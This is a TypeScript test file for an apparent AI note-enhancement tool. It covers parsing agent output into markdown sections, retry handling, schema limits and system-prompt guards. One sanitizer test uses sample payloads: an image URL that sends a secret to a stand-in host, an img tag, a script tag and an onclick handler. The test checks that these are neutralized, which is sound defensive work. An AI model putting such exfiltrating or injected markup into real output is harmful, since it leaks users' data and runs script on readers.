import { describe, expect, test } from "bun:test";
import { AI_BLOCK_END, type Section } from "../src/note/markers.js";
import {
  buildSectionOutputSchema,
  DEFAULT_EDITORIAL_GUIDANCE,
  ENHANCEMENT_SAFETY_PREAMBLE,
  extractLastFencedJson,
  MAX_HEADING_CHARACTERS,
  MAX_MARKDOWN_CHARACTERS,
  MAX_SECTIONS,
  parseSectionOutput,
  queryForSections,
  type AgentClient,
  type AgentQueryRequest,
  type AgentQueryResponse,
} from "../src/agent/contract.js";

const valid = [{ heading: "Summary", markdown: "Done" }];

describe("fenced JSON section contract", () => {
  test("extracts a fenced json block surrounded by prose", () => {
    expect(parseSectionOutput(`before\n\`\`\`json\n${JSON.stringify(valid)}\n\`\`\`\nafter`)).toEqual({ ok: true, sections: valid });
  });

  test("uses the last fenced json block when several are present", () => {
    const first = JSON.stringify([{ heading: "Old", markdown: "ignore" }]);
    const last = JSON.stringify(valid);
    const message = `\`\`\`json\n${first}\n\`\`\`\ntext\n\`\`\`json\n${last}\n\`\`\``;
    expect(extractLastFencedJson(message)?.trim()).toBe(last);
    expect(parseSectionOutput(message)).toEqual({ ok: true, sections: valid });
  });

  test("rejects output with no fenced json block", () => {
    expect(parseSectionOutput(JSON.stringify(valid))).toMatchObject({ ok: false, error: expect.stringContaining("No fenced") });
  });

  test("rejects malformed fenced json", () => {
    expect(parseSectionOutput("```json\n[{ nope }]\n```")).toMatchObject({ ok: false, error: expect.stringContaining("Malformed JSON") });
  });

  test("accepts markdown code fences and raw newlines inside a JSON string", () => {
    expect(parseSectionOutput('```json\n[{"heading":"API","markdown":"```ts\nfoo()\n```\ndone"}]\n```')).toEqual({
      ok: true,
      sections: [{ heading: "API", markdown: "```ts\nfoo()\n```\ndone" }],
    });
  });

  test("trims edge newlines before writer validation", () => {
    expect(parseSectionOutput('```json\n[{"heading":"Summary","markdown":"\\n- item\\n"}]\n```')).toEqual({
      ok: true,
      sections: [{ heading: "Summary", markdown: "- item" }],
    });
  });

  test("neutralizes external images and dangerous raw HTML", () => {
    const markdown = '![](https://evil.example/?d=secret)\n<img src="https://evil.example/x">\n<script>alert(1)</script>\n<div onclick="steal()">x</div>';
    const result = parseSectionOutput(`\`\`\`json\n${JSON.stringify([{ heading: "Summary", markdown }])}\n\`\`\``);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.sections[0]!.markdown).toContain("`![](https://evil.example/?d=secret)`");
      expect(result.sections[0]!.markdown).not.toContain("<img");
      expect(result.sections[0]!.markdown).not.toContain("<script");
      expect(result.sections[0]!.markdown).not.toContain("<div onclick=");
      expect(result.sections[0]!.markdown).toContain("&lt;img");
    }
  });

  test("rejects schema violations including empty arrays and headings", () => {
    expect(parseSectionOutput("```json\n[]\n```").ok).toBe(false);
    expect(parseSectionOutput('```json\n[{"heading":" ","markdown":3}]\n```').ok).toBe(false);
  });

  test("retries once then skips and preserves the last good sections", async () => {
    const agent = new SequenceAgent([
      { finalAssistantMessage: "not json", sessionId: "session-a" },
      { finalAssistantMessage: "still not json", sessionId: "session-b" },
    ]);
    const lastGood: readonly Section[] = [{ heading: "Existing", markdown: "Keep me" }];
    const errors: string[] = [];
    const result = await queryForSections(agent, request(), lastGood, { error: (message) => errors.push(String(message)) });
    expect(agent.requests).toHaveLength(2);
    expect(agent.requests[1]?.prompt).toContain("Validation error");
    expect(result).toEqual(expect.objectContaining({ status: "skipped", sections: lastGood, attempts: 2 }));
    expect(errors[0]).toContain("OUTPUT REJECTED AFTER TWO ATTEMPTS");
  });

  test("a same-pass retry resumes the first attempt's session id", async () => {
    const agent = new SequenceAgent([
      { finalAssistantMessage: "not json", sessionId: "session-first-attempt" },
      { finalAssistantMessage: '```json\n' + JSON.stringify(valid) + '\n```', sessionId: "session-second-attempt" },
    ]);
    const result = await queryForSections(agent, request(), [], { error: () => {} });
    expect(agent.requests).toHaveLength(2);
    expect(agent.requests[0]).not.toHaveProperty("sessionId");
    expect(agent.requests[1]?.sessionId).toBe("session-first-attempt");
    expect(result).toEqual(expect.objectContaining({ status: "valid", sessionId: "session-second-attempt" }));
  });

  test("rejects marker tokens in model output", () => {
    const message = `\`\`\`json\n${JSON.stringify([{ heading: "Summary", markdown: AI_BLOCK_END }])}\n\`\`\``;
    expect(parseSectionOutput(message)).toMatchObject({ ok: false, error: expect.stringContaining("ownership marker") });
  });
});

class SequenceAgent implements AgentClient {
  readonly requests: AgentQueryRequest[] = [];
  readonly #responses: AgentQueryResponse[];

  constructor(responses: AgentQueryResponse[]) {
    this.#responses = responses;
  }

  async query(requestValue: AgentQueryRequest): Promise<AgentQueryResponse> {
    this.requests.push(requestValue);
    const response = this.#responses.shift();
    if (response === undefined) throw new Error("No fake response configured.");
    return response;
  }
}

function request(): AgentQueryRequest {
  return {
    prompt: "enhance",
    systemPrompt: "contract",
    cwd: process.cwd(),
    tools: [],
    settingSources: [],
    maxTurns: 2,
  };
}

describe("structured output schema", () => {
  test("roots the section array in an object envelope", () => {
    const schema = buildSectionOutputSchema();
    expect(schema).toMatchObject({
      type: "object",
      required: ["sections"],
      additionalProperties: false,
    });
    expect(Object.keys(node(schema, "properties"))).toEqual(["sections"]);
  });

  test("carries the zod limits, so a limit edit that fails to propagate is caught here", () => {
    const sections = node(buildSectionOutputSchema(), "properties", "sections");
    expect(sections.type).toBe("array");
    expect(sections.minItems).toBe(1);
    expect(sections.maxItems).toBe(MAX_SECTIONS);
    const properties = node(sections, "items", "properties");
    expect(node(properties, "heading").maxLength).toBe(MAX_HEADING_CHARACTERS);
    expect(node(properties, "markdown").maxLength).toBe(MAX_MARKDOWN_CHARACTERS);
    expect(node(sections, "items").additionalProperties).toBe(false);
    expect(node(sections, "items").required).toEqual(["heading", "markdown"]);
  });

  test("describes every field, because the descriptions replace the deleted prose contract", () => {
    const sections = node(buildSectionOutputSchema(), "properties", "sections");
    const properties = node(sections, "items", "properties");
    expect(String(sections.description)).toContain("full desired state");
    expect(String(node(properties, "heading").description)).toContain("level-two heading");
    expect(String(node(properties, "markdown").description)).toContain("Obsidian");
  });

  test("omits the dialect declaration, which is meaningless on a nested subschema", () => {
    const sections = node(buildSectionOutputSchema(), "properties", "sections");
    expect(sections).not.toHaveProperty("$schema");
  });
});

describe("enhancement system prompt", () => {
  test("carries no machine format contract any more", () => {
    const prompt = `${ENHANCEMENT_SAFETY_PREAMBLE}\n\n${DEFAULT_EDITORIAL_GUIDANCE}`;
    expect(prompt).not.toContain("```json");
    expect(prompt.toLowerCase()).not.toContain("fenced");
    expect(prompt.toLowerCase()).not.toContain("escape");
    expect(prompt).not.toContain('{"heading"');
  });

  test("the fixed half keeps every guard neither the schema nor a refinement can do", () => {
    expect(ENHANCEMENT_SAFETY_PREAMBLE).toContain("untrusted data");
    expect(ENHANCEMENT_SAFETY_PREAMBLE).toContain("marker tokens");
    expect(ENHANCEMENT_SAFETY_PREAMBLE).toContain("level-two headings");
    expect(ENHANCEMENT_SAFETY_PREAMBLE).toContain("host application alone owns writes");
    expect(ENHANCEMENT_SAFETY_PREAMBLE).toContain("authoritative");
  });

  test("the overridable half carries only editorial voice", () => {
    expect(DEFAULT_EDITORIAL_GUIDANCE).toContain("AI-owned section block");
    expect(DEFAULT_EDITORIAL_GUIDANCE).toContain("add, rename, reorder, or drop");
    expect(DEFAULT_EDITORIAL_GUIDANCE).not.toContain("untrusted");
    expect(DEFAULT_EDITORIAL_GUIDANCE).not.toContain("marker");
  });

  test("both halves reach the package entry point, since Phase B seeds a setting from the guidance", async () => {
    const entry = await import("../src/index.js");
    expect(entry.ENHANCEMENT_SAFETY_PREAMBLE).toBe(ENHANCEMENT_SAFETY_PREAMBLE);
    expect(entry.DEFAULT_EDITORIAL_GUIDANCE).toBe(DEFAULT_EDITORIAL_GUIDANCE);
  });
});

function node(schema: Record<string, unknown>, ...path: readonly string[]): Record<string, unknown> {
  let current = schema;
  for (const key of path) current = current[key] as Record<string, unknown>;
  return current;
}
